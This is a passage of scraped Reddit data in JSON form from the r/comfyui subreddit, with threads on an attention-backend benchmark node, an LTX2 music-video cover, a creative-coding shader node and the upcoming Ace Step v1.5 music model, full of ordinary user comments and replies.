                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1v7jiu",
          "author": "RIP26770",
          "text": "Does it work with PyTorch XPU (Intel Arc iGPU and GPU) ?",
          "score": 2,
          "created_utc": "2026-01-26 18:36:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v8r9h",
              "author": "D_Ogi",
              "text": "I have no idea, but that's the point of this post!  :)",
              "score": 2,
              "created_utc": "2026-01-26 18:41:07",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1vk4ji",
          "author": "ThiagoAkhe",
          "text": "Thank you!",
          "score": 2,
          "created_utc": "2026-01-26 19:29:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1vpoht",
              "author": "D_Ogi",
              "text": "Let me know if it works for you, please!",
              "score": 2,
              "created_utc": "2026-01-26 19:53:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vyx6q",
                  "author": "ThiagoAkhe",
                  "text": "https://preview.redd.it/u5y005en6rfg1.png?width=1985&format=png&auto=webp&s=c0f05ebe351e6e17edf3f0703cbe454130d79701\n\nGPU: Rxt 4060 8gb   \n  \nOS: Windows 11  \n  \nModel: Z-Image  \n  \nseq\\_len: 8192  \n  \nBest backend + speedup: img  \n  \nNotes (quality/stability, VRAM, any errors): I read the compatible models listed on your GitHub, but I wanted to test it with Z-Image. Everything worked correctly, but the only error I encountered was a message saying it couldn‚Äôt detect which version of SageAttention I had installed, even though it was version 2.1.1 and properly installed => ..dtype: float16 | head\\_dim: 128 | seq\\_len: 8192 | CUDA: 13.0 | Triton: 3.5.1  \n**SageAttention: vunknown**",
                  "score": 1,
                  "created_utc": "2026-01-26 20:33:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1vuqbh",
          "author": "pwillia7",
          "text": "Really cool idea thanks for building and releasing",
          "score": 2,
          "created_utc": "2026-01-26 20:15:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wy36l",
          "author": "Southern-Chain-6485",
          "text": "This is interesting, but isn't the answer that Sage Attention is faster if the model supports it (ie, not Qwen)? Is there any model in which something is faster than Sage?",
          "score": 2,
          "created_utc": "2026-01-26 23:15:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1y318w",
          "author": "separatelyrepeatedly",
          "text": "fails for wan 2.2 ComfyUI-WanMoeKSampler node. I need to do more testing.",
          "score": 2,
          "created_utc": "2026-01-27 02:52:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1v51sq",
          "author": "ReasonablePossum_",
          "text": "Question, does running comfyui w sage attention accelerates image generation in general or only on certain workflows?",
          "score": 1,
          "created_utc": "2026-01-26 18:25:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1v71uu",
              "author": "D_Ogi",
              "text": "In general it speeds up generation across most workflows (like other attention/back-end optimizations), but the exact ‚Äúwhen and why‚Äù depends on your model, resolution, and node graph, which is basically the whole point of that post :)",
              "score": 1,
              "created_utc": "2026-01-26 18:33:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vhkp1",
                  "author": "GreyScope",
                  "text": "& gpu",
                  "score": 3,
                  "created_utc": "2026-01-26 19:18:11",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1vdasv",
                  "author": "ReasonablePossum_",
                  "text": "So the node works on a workflow by workflow basis and not in absolute system wide optimization?\n\nBecause I just managed to install sage, and was wondering if I should just always launch comfyui with it.",
                  "score": 1,
                  "created_utc": "2026-01-26 19:00:01",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1vtobn",
          "author": "NickCanCode",
          "text": "Looks like the node doesn't provide an option to select a card? I have both 5070 and 3060 installed.",
          "score": 1,
          "created_utc": "2026-01-26 20:10:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o20xxs0",
              "author": "an80sPWNstar",
              "text": "This is usually where you'd use the multigpu nodes and select which gpu is doing the compute",
              "score": 1,
              "created_utc": "2026-01-27 14:59:50",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1x67ln",
          "author": "Icy_Concentrate9182",
          "text": "Sage attention 2.2+ should be the fastest across all workflows for most cases.\n\nSA3 is even faster, but the current implementation means it fails in some stages and has to be selectively enabled and disabled within the workflow. \n\nThis is more to satisfy curiosity, but I'm happy to be corrected.",
          "score": 1,
          "created_utc": "2026-01-26 23:57:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1yf5dy",
          "author": "blackhuey",
          "text": "Is this worth trying on lower VRAM rigs? My key \"speed\" factor is whether I run out of VRAM and start paging, not necessarily which workflow is technically faster.",
          "score": 1,
          "created_utc": "2026-01-27 04:01:52",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1z9er9",
          "author": "Abject-Recognition-9",
          "text": ":(  i cant get this to work, as soon as is run comfy stop and i need reboot",
          "score": 1,
          "created_utc": "2026-01-27 07:47:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o20e57p",
          "author": "bladerunner2048",
          "text": "The launch itself went without any errors. but for me there was no increase in speed.  Rather, this is simply not my case with my config -win10 3050ti (4gb vram) + flux2klein4b nvfp4. But it‚Äôs good that there are such enthusiasts",
          "score": 1,
          "created_utc": "2026-01-27 13:18:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o231i0e",
          "author": "DeathToHumankind",
          "text": "Added it to my very simple workflow but i have 0 changes to generation speed. Added it to the workflow as you git page suggested.   \nGPU: 4070 Ti Super  \nOS: Win 11  \nModel: SDXL Illustrious  \nseq\\_len: i have no idea what is that :D  \nNo errors during generation, but i had error during instalation of flash-attn.",
          "score": 1,
          "created_utc": "2026-01-27 20:30:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o23t7l2",
              "author": "D_Ogi",
              "text": "I guess you are missing any working attention kernel.",
              "score": 2,
              "created_utc": "2026-01-27 22:36:32",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o25womo",
                  "author": "DeathToHumankind",
                  "text": "Would you kindly explain what is that and how do I get one?\nI'm fairly new to comfy and would love to make that node work",
                  "score": 1,
                  "created_utc": "2026-01-28 05:27:43",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1v5293",
          "author": "AmeenRoayan",
          "text": "![gif](giphy|KvD3fWqBEiZwyLjKu8)",
          "score": 1,
          "created_utc": "2026-01-26 18:25:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1weeyh",
          "author": "Upset-Virus9034",
          "text": "Is this real, should I read all the discussion?\n\n![gif](giphy|JULfVYQH3XkCxMV0QP)",
          "score": 1,
          "created_utc": "2026-01-26 21:42:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ux920",
          "author": "Electrical_Car6942",
          "text": "Hmm",
          "score": -6,
          "created_utc": "2026-01-26 17:52:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1uxgbm",
              "author": "D_Ogi",
              "text": "yup?",
              "score": 4,
              "created_utc": "2026-01-26 17:53:44",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1vu9yx",
                  "author": "mallibu",
                  "text": "Hmmmm",
                  "score": 0,
                  "created_utc": "2026-01-26 20:13:17",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qpf9n8",
      "title": "LTX2 - Never Fade Away (cover) part2",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/pz3v2z9g44gg1",
      "author": "Warthog_Specialist",
      "created_utc": "2026-01-28 15:59:37",
      "score": 171,
      "num_comments": 35,
      "upvote_ratio": 0.92,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qpf9n8/ltx2_never_fade_away_cover_part2/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o29adxe",
          "author": "Dohwar42",
          "text": "Wow great work! I'm really surprised by how much use this workflow has gotten. This is literally the 3rd or 4th post I've come across that mentioned using the workflow I created a few weeks ago.  \n  \n I really thought it would be of limited use since it was mostly going to be a static camera (due to the lora). There are probably better optimized workflows out there by now which probably haven't gotten as much attention as mine. The workflow  is just a heavily modified workflow of an early and messy \"use your own mp3/audio\" that I found when LTX-2 first came out.   \n  \nBy the way, the steps value in the first pass is actually set really, really high at 25 steps. I meant to update that post with a version 3 to note that you can actually get away with just 15 steps, maybe less in this node. Lowering this allows for higher resolutions or longer videos at certain resolutions. I've seen a few people get up to 40-50s at near 720p if they have your hardware though it is kinda boring watching one shot for that long. I think 15-25 is good for each shot mixed in with non-lip synced audio.   \n\n\nI've taken a bit of a break from Ai generation but it's great to see what people are up to.\n\nhttps://preview.redd.it/gzb5oq6xr4gg1.png?width=724&format=png&auto=webp&s=8098263ea646f6310b29aaef0fd33aad39fee2a1",
          "score": 11,
          "created_utc": "2026-01-28 18:09:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o29haj9",
              "author": "Warthog_Specialist",
              "text": "It gave a great foundation I guess for the people to start on, as it's maybe messy but really easy to follow. I modified it some more this week to make use of the first to last frame technique, so I'm planning to take it for another spin this coming weekend. Wonder how it will perform with french lip syncing, as Clair obscur has some amazing songs too, though the art for this game is not as abundant as for CP2077, but I'll try to make something out of it ;)\n\nHuge thanks again for your contribution to the community ü´∂",
              "score": 3,
              "created_utc": "2026-01-28 18:39:22",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2bt8b3",
          "author": "i_am_fear_itself",
          "text": "The quality if this literally made me gasp while watching it. WELL-FUCKING-DONE!!!",
          "score": 6,
          "created_utc": "2026-01-29 01:13:03",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2d0krt",
              "author": "Warthog_Specialist",
              "text": "Thx for such a high praise mate, means a lot :)",
              "score": 2,
              "created_utc": "2026-01-29 05:31:48",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o292rf5",
          "author": "Cadmium9094",
          "text": "Amazing!",
          "score": 2,
          "created_utc": "2026-01-28 17:37:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o293v62",
              "author": "Warthog_Specialist",
              "text": "Thx mate, glad you liked it :)",
              "score": 1,
              "created_utc": "2026-01-28 17:42:02",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o29obam",
          "author": "ComputerArtClub",
          "text": "Really enjoyed this! Great work!!",
          "score": 2,
          "created_utc": "2026-01-28 19:09:26",
          "is_submitter": false,
          "replies": [
            {
              "id": "o29rz2e",
              "author": "Warthog_Specialist",
              "text": "Thanks mate, much appreciated:)",
              "score": 1,
              "created_utc": "2026-01-28 19:25:47",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2a2w0v",
          "author": "Rythameen",
          "text": "As a fan of both LTX 2 and CP2077, I really enjoyed this, as you said, a few quirks here and there, but really outstanding work.",
          "score": 2,
          "created_utc": "2026-01-28 20:14:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2aabdj",
              "author": "Warthog_Specialist",
              "text": "Thx, really appreciate it :)\n\nAs for the quirks, I think it's more of not enough time spent than the model shortcomings. Almost everyday someone takes a dump on LTX2 and while it's far far from perfect, all in one solution, imo, it gave us so much to work and have fun with:) Shout out to the devs, if you are for some reason reading this, you are amazingüí™",
              "score": 2,
              "created_utc": "2026-01-28 20:47:43",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2a9b7c",
          "author": "Upset-Virus9034",
          "text": "Great,\nWhat about the part 2, can some one link üîó it here? üôè",
          "score": 2,
          "created_utc": "2026-01-28 20:43:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2ae2tt",
              "author": "Warthog_Specialist",
              "text": "Well, I have a 140 second video from the start of the song, it's a bit on the nsfw side so to speak. Nothing crazy, just Panam in a somewhat revealing dress, Panam on the hood of a car and Judy with neon green stockings and green pasties on her breasts. Nothing explicit but my post from another subreddit got removed for being too sexually appealing I guess lol üòÇ So for this second part I swayed a bit into puppy friendly territory. But if the 18+ tag is enough for it to survive here, I'll gladly post it too, it has Misty instead of Aurora at the closing part of a video.",
              "score": 1,
              "created_utc": "2026-01-28 21:04:01",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2asb3y",
          "author": "Artforartsake99",
          "text": "Wow this is insanely good.  Looks like high quality 3d. üëå",
          "score": 2,
          "created_utc": "2026-01-28 22:05:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2cywho",
              "author": "Warthog_Specialist",
              "text": "Thx, means a lot:)\n\nI was really impressed on how with the right prompting you can control ltx2 to handle movement, so it can stay pretty close to the initial still 3d render to make it into a nice, smooth, 3d animation almost video.",
              "score": 1,
              "created_utc": "2026-01-29 05:19:39",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2aws5w",
          "author": "_VirtualCosmos_",
          "text": "Fuck, this song... got me so emotional again",
          "score": 2,
          "created_utc": "2026-01-28 22:26:15",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2czd35",
              "author": "Warthog_Specialist",
              "text": "When my female V started singing it before returning to earth in one of the Hanako endings... yeah ü•≤",
              "score": 2,
              "created_utc": "2026-01-29 05:22:55",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2bolhi",
          "author": "King_Salomon",
          "text": "great work! may I ask, i know ltx can generate audio, but how can you match the lip sync to an existing audio? i am guessing this song preexisting to the video generation, so if you type in the lyrics in the prompt how can you match it to the actual song? anyway looking really good!\n\nEDIT\nok never mind i see the link to the workflow. tnx!",
          "score": 2,
          "created_utc": "2026-01-29 00:47:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2czuwg",
              "author": "Warthog_Specialist",
              "text": "Thx :) I tried prompting the lyrics too, the results were somewhat inconsistent, so for me just very strict prompting on when and how the mouth should react to the sung lyrics worked best.",
              "score": 2,
              "created_utc": "2026-01-29 05:26:30",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2dxqnx",
          "author": "apifree",
          "text": "Not gonna lie, this goes hard",
          "score": 2,
          "created_utc": "2026-01-29 10:20:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2e0ysc",
              "author": "Warthog_Specialist",
              "text": "Ty, happy to hear that :)",
              "score": 1,
              "created_utc": "2026-01-29 10:49:25",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2e5xtt",
          "author": "Aware-Swordfish-9055",
          "text": "How are you doing I2V üòÆ?\nMy attempts don't keep the same starting image, it gets distorted or changes identity.",
          "score": 2,
          "created_utc": "2026-01-29 11:30:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2e8cuk",
              "author": "Warthog_Specialist",
              "text": "Are you using the same workflow? If yes, try to guide the model through the whole duration of your video, describe to the model everything you want to happen, describe the identity of a person in the first frame, the mood, all the movements that you want and don't want to see. In short be as detailed as possible. Also explicitly tell the model to stick to the starting image as reference.",
              "score": 1,
              "created_utc": "2026-01-29 11:48:55",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2ebfoj",
          "author": "LyriWinters",
          "text": "You need to actually do some cinematography and not just headshots strung together.",
          "score": 2,
          "created_utc": "2026-01-29 12:10:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2f1e5b",
              "author": "Warthog_Specialist",
              "text": "Yeah, had some really nice full body shots in the first 3 scenes for the song, but as it was dimed \"too suggestive\" by some mods at the StableDiffusion subreddit, i went with this waist up/portrait shots, just to be safe üòÖ \n\nOf course I would like to do some more than roll in/roll out stuff, plan to try it at the weekend. I hope first to last frame will help with consistency on those, coz the more you give the model stuff to work with the more hallucinations prone it becomes. We'll see how it goes.\n\nThx for your comment.",
              "score": 1,
              "created_utc": "2026-01-29 14:39:46",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o2fjill",
                  "author": "LyriWinters",
                  "text": "I think the best way to learn is to copy others. Take a music video that's decently popular that matches the genre. Then copy it.  \nAfter youve done that 4-5 times you kind of get the gist of this type of cinematography. What youll notice is that each shot is very seldom longer than 3 seconds.\n\nfirst-last frame is not the solution. For consistency you need a lora for your character :)",
                  "score": 2,
                  "created_utc": "2026-01-29 16:03:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o2el7p0",
          "author": "Tramagust",
          "text": "Woah you have a 5090 with 64GB?",
          "score": 2,
          "created_utc": "2026-01-29 13:14:09",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2f1oso",
              "author": "Warthog_Specialist",
              "text": "5090 and 64gb of system RAM",
              "score": 1,
              "created_utc": "2026-01-29 14:41:13",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2ev09m",
          "author": "OddResearcher1081",
          "text": "Sorry but this is just not watchable.  It is these types of video experiments that make AI look bad.",
          "score": 2,
          "created_utc": "2026-01-29 14:07:03",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2f44a8",
              "author": "Warthog_Specialist",
              "text": "My main drive behind posting this was to show how decent with very little prior knowledge LTX2 can be as a free video model.\n\nCan you elaborate on a negative side some more? It does not have \"crazy stuff happening on screen every 3 seconds\" or that plastic look most of the free video models give by default. What caught your eye as a \"bad ai experiment\"?",
              "score": 1,
              "created_utc": "2026-01-29 14:53:08",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2bu3h0",
          "author": "i_am_fear_itself",
          "text": "/u/savevideo",
          "score": 1,
          "created_utc": "2026-01-29 01:17:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2bu3rj",
              "author": "SaveVideo",
              "text": "###[View link](https://rapidsave.com/info?url=/r/comfyui/comments/1qpf9n8/ltx2_never_fade_away_cover_part2/)\n\n\n --- \n [**Info**](https://np.reddit.com/user/SaveVideo/comments/jv323v/info/)&#32;|&#32; [**Feedback**](https://np.reddit.com/message/compose/?to=Kryptonh&subject=Feedback for savevideo)&#32;|&#32;[**Donate**](https://ko-fi.com/getvideo) &#32;|&#32; [**DMCA**](https://np.reddit.com/message/compose/?to=Kryptonh&subject=Content removal request for savevideo&message=https://np.reddit.com//r/comfyui/comments/1qpf9n8/ltx2_never_fade_away_cover_part2/) &#32;|&#32; \n [^(reddit video downloader)](https://rapidsave.com) &#32;|&#32; [^(twitter video downloader)](https://twitsave.com)",
              "score": 1,
              "created_utc": "2026-01-29 01:17:58",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o2bt1du",
          "author": "dirtybeagles",
          "text": "Question, what post processing did you do for these?",
          "score": 1,
          "created_utc": "2026-01-29 01:12:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2d0dpq",
              "author": "Warthog_Specialist",
              "text": "Just some basic stuff, mainly soft lighting on all the scenes as it takes that \"ai generated\" edge off, snow in the first scene and image glitching on the scene transitions.",
              "score": 2,
              "created_utc": "2026-01-29 05:30:22",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2d0rnz",
          "author": "Comfortable_Swim_380",
          "text": "Omg it was amazing until she opened her mouth and the rest was just caaaaaaaaw!! ROFL.",
          "score": -1,
          "created_utc": "2026-01-29 05:33:11",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qkowfo",
      "title": "Creative Code",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/yoec80at83fg1",
      "author": "skbphy",
      "created_utc": "2026-01-23 11:58:30",
      "score": 156,
      "num_comments": 16,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkowfo/creative_code/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o184mdx",
          "author": "LeKhang98",
          "text": "ELI5 please? Is it a node that I can put simple code directly into it to process input (image, latent, audio, etc)? As a non-coder I'd love to be able to do that.",
          "score": 6,
          "created_utc": "2026-01-23 12:15:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o186h4q",
              "author": "skbphy",
              "text": "It‚Äôs a creative coding node (GLSL/ShaderToy + p5.js) that renders images/animation frames in ComfyUI. Even if you don‚Äôt code, you can use built-in animations and the AI(ollama) helper. The focus is visuals/animation, not general audio processing(You *can* use the rendered image in latent workflows by encoding it back to latent), but the node itself doesn‚Äôt directly process latents.).  English isn‚Äôt my first language, but I hope I explained it clearly.",
              "score": 8,
              "created_utc": "2026-01-23 12:28:33",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o19ji8t",
                  "author": "LeKhang98",
                  "text": "Thank you I understand it now.",
                  "score": 2,
                  "created_utc": "2026-01-23 16:38:44",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o18lz63",
          "author": "FreezaSama",
          "text": "I would love to try this or similar IF it takes the input image in consideration. This node doesn't seem to do that all the times?",
          "score": 4,
          "created_utc": "2026-01-23 13:59:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18rxg1",
              "author": "skbphy",
              "text": "[https://github.com/SKBv0/ComfyUI\\_CreativeCode/blob/main/HOW\\_TO\\_USE.md#using-textures](https://github.com/SKBv0/ComfyUI_CreativeCode/blob/main/HOW_TO_USE.md#using-textures) check this out",
              "score": 1,
              "created_utc": "2026-01-23 14:29:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o18lsd5",
          "author": "bingobongo3001",
          "text": "I just love the way it looks!",
          "score": 2,
          "created_utc": "2026-01-23 13:58:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1bpehf",
          "author": "pwillia7",
          "text": "Dude COOL! -- Does this work fine with the API?",
          "score": 2,
          "created_utc": "2026-01-23 22:40:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1c5m5z",
              "author": "skbphy",
              "text": "No idea. I haven't tested it.",
              "score": 1,
              "created_utc": "2026-01-24 00:06:58",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1jthq6",
              "author": "deadzenspider",
              "text": "I‚Äôm pretty sure you can export the JSON API for every workflow and then run it via websockets",
              "score": 1,
              "created_utc": "2026-01-25 03:03:23",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1jtrra",
                  "author": "pwillia7",
                  "text": "some logic nodes don't work for a reason I can't now remember",
                  "score": 1,
                  "created_utc": "2026-01-25 03:04:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o268dl0",
          "author": "UnseenLayers",
          "text": "thank you for sharing, it looks amazing",
          "score": 2,
          "created_utc": "2026-01-28 06:57:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o186xf5",
          "author": "ANR2ME",
          "text": "Btw, what's the output string (source code)blooked like? in which language is the output source code? ü§î",
          "score": 1,
          "created_utc": "2026-01-23 12:31:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18800c",
              "author": "skbphy",
              "text": "It simply passes the code written in the editor or settings node as a string. It‚Äôs not important on its own. I added it for automation.",
              "score": 2,
              "created_utc": "2026-01-23 12:38:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o19cj0l",
          "author": "35point1",
          "text": "So basically this is a code snippet generator node with a built in preview and customized widget ui‚Ä¶\n\nI‚Äôve never used those libraries you mentioned but does your node just spit out a js function or similar to produce a canvas animation? I really like the customization to accomplish this!",
          "score": 1,
          "created_utc": "2026-01-23 16:07:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1c5hz9",
              "author": "skbphy",
              "text": "Pretty much but it‚Äôs more than a snippet generator. it actually runs the code with a live preview and you can even turn // uniform ... comments into UI sliders / color pickers.  here  [https://github.com/SKBv0/ComfyUI\\_CreativeCode?tab=readme-ov-file#interactive-uniforms](https://github.com/SKBv0/ComfyUI_CreativeCode?tab=readme-ov-file#interactive-uniforms)",
              "score": 1,
              "created_utc": "2026-01-24 00:06:21",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1l0xtf",
          "author": "InoSim",
          "text": "I can't read because of video quality... are the buttons you click able to be setup ? like i create a new one with my own parameters ?",
          "score": 1,
          "created_utc": "2026-01-25 08:04:27",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qmy83p",
      "title": "Ace Step v1.5 almost ready",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qmy83p",
      "author": "iChrist",
      "created_utc": "2026-01-25 22:50:12",
      "score": 155,
      "num_comments": 34,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "News",
      "permalink": "https://reddit.com/r/comfyui/comments/1qmy83p/ace_step_v15_almost_ready/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1plum0",
          "author": "_Ruffy_",
          "text": "Wow, easy LoRA training with just 12gigs of VRAM? Thats gonna change things.",
          "score": 16,
          "created_utc": "2026-01-25 22:53:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ppxo0",
              "author": "iChrist",
              "text": "Yep it‚Äôs exciting but I am here for the 3-5 seconds generations.\nHeartMula which is also good takes 2 minutes which is just not worth it with all the re-rolls due to model not adhering to tags.\n\nAce step v1.5 will fix all of those issues",
              "score": 7,
              "created_utc": "2026-01-25 23:11:54",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1puirs",
                  "author": "ANR2ME",
                  "text": "I heard ACE-Step also supports more languages than HeartMula ü§î",
                  "score": 1,
                  "created_utc": "2026-01-25 23:33:42",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1rd6c2",
              "author": "urabewe",
              "text": "Admin on the discord said it also trains at just about the same speed as inference. They made a Lora with 8 data samples and only 20 minutes. Crazy",
              "score": 3,
              "created_utc": "2026-01-26 04:17:18",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1qapij",
          "author": "shiftdeleat",
          "text": "incredible, have been waiting years for this. suno is great, but their copyright is so aggressive, and anything uploaded is used for training - no opt out.",
          "score": 9,
          "created_utc": "2026-01-26 00:52:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1qfd4k",
              "author": "iChrist",
              "text": "I just asked in discord and the developer told me that it‚Äôs 10 times faster than v1\n\nA full song should take 1-2 seconds on a 3090 ü§Ø",
              "score": 8,
              "created_utc": "2026-01-26 01:15:50",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1r0tmy",
                  "author": "FaceDeer",
                  "text": "At some point I'll be able to tell my personal assistant \"play a soundtrack to my life, please\" and it'll just go.\n\nNot sure what I'll do when the background music turns ominous and creepy, though.",
                  "score": 4,
                  "created_utc": "2026-01-26 03:04:55",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1qcjxu",
          "author": "reality_comes",
          "text": "How do you get in their discord?",
          "score": 3,
          "created_utc": "2026-01-26 01:01:31",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1qcvd3",
              "author": "iChrist",
              "text": "Listed in the Github.\n\n[https://discord.gg/PeWDxrkdj7](https://discord.gg/PeWDxrkdj7)\n\nhttps://preview.redd.it/cg0kn1p2flfg1.jpeg?width=1179&format=pjpg&auto=webp&s=288555a452ab360edea011e5a88fd566aa9eb028",
              "score": 5,
              "created_utc": "2026-01-26 01:03:07",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1sxbif",
          "author": "LepoRaf",
          "text": "It supports 50 languages ‚Äã‚Äãüòâ Have faith, tomorrow you will be very happy üòâ",
          "score": 3,
          "created_utc": "2026-01-26 11:51:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1q1a1e",
          "author": "Eydahn",
          "text": "This is massiveüôåüèª Can‚Äôt wait!",
          "score": 2,
          "created_utc": "2026-01-26 00:06:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22at32",
          "author": "iChrist",
          "text": "[https://ace-step.github.io/ace-step-v1.5.github.io/](https://ace-step.github.io/ace-step-v1.5.github.io/)\n\nThe project page is ready, with many examples of the new model.  \nComfyorg should already start integrating it into ComfyUI",
          "score": 2,
          "created_utc": "2026-01-27 18:33:38",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o1re79m",
          "author": "xcdesz",
          "text": "Is this version going to have a text to music, or music to music?  I seem to remember the last version you fed it some music, and it started out similar to the song, and then diverged into something different.  Although you did feed it lyrics.",
          "score": 1,
          "created_utc": "2026-01-26 04:23:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1rh7yg",
              "author": "iChrist",
              "text": "It has text2music with optional thinking mode to expand the user prompt and add instruments and the structure of the song.\n\nIt also supports music2music, look at the second image I uploaded to the post.\n\nThey shared examples and it‚Äôs promising.",
              "score": 3,
              "created_utc": "2026-01-26 04:43:11",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1tuj1y",
          "author": "Fancy-Future6153",
          "text": "When we can try to use Ace Step 1.5 in ComfyUI? :)",
          "score": 1,
          "created_utc": "2026-01-26 15:03:48",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1qxi3c",
          "author": "mallibu",
          "text": "Can we stop with the hypings in this sub.\n\nWe don't give a shit about paragraphs and previews, give us the model/tool and if it's good it's gonna take off in a few hours.",
          "score": -8,
          "created_utc": "2026-01-26 02:47:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1r1ej6",
              "author": "iChrist",
              "text": "I would normally not hype something, but this is really exciting and has great previews and a very responsive dev.\nJust wanted more attention towards that project.",
              "score": 5,
              "created_utc": "2026-01-26 03:08:02",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1r7e9e",
                  "author": "mallibu",
